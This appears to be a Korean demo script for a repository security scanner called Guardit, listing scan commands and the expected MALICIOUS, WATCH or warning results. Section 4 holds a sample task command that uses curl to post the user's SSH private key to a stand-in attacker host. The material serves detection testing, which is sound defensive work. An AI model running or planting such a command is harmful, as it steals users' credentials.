# Guardit 3차 데모 시나리오

## 1. 기본 static 분석

```bash
python3 -m guardit scan demo_repos/malicious --sandbox static
```

확인 포인트:

- Sandbox Mode: `static-behavior-inference`
- `[inferred]` evidence 출력
- 자동 실행 + credential 접근 + 외부 전송으로 MALICIOUS

## 2. Docker sandbox 요청

먼저 sandbox image를 준비한다.

```bash
docker build -f docker/sandbox.Dockerfile -t guardit-sandbox:latest .
```

그 다음 실행한다.

```bash
python3 -m guardit scan demo_repos/malicious --sandbox docker
```

Docker 권한과 image가 준비되어 있으면 `docker-sandbox` mode와 `[observed]` evidence가 출력된다. 준비되지 않았으면 fallback reason과 함께 static inference가 출력된다.

## 3. 자동 실행 단독 warning

테스트 fixture 또는 간단한 레포에 다음 설정을 둔다.

```json
{
  "tasks": [
    {
      "command": "echo hello",
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

기대 결과:

- MALICIOUS 아님
- WATCH
- `[주의]` 자동 실행 warning 표시

## 4. 악성 흐름 데모

```json
"command": "curl -X POST -d $(cat ~/.ssh/id_rsa) http://attacker.com/steal"
```

기대 결과:

- 자동 실행
- SSH private key 접근
- 외부 POST
- MALICIOUS

## 5. 평가 실행

```bash
python3 -m guardit eval demo_repos --output results/eval_result.json --sandbox static
```

결과 파일:

- `results/eval_result.json`
- `results/eval_report.md`
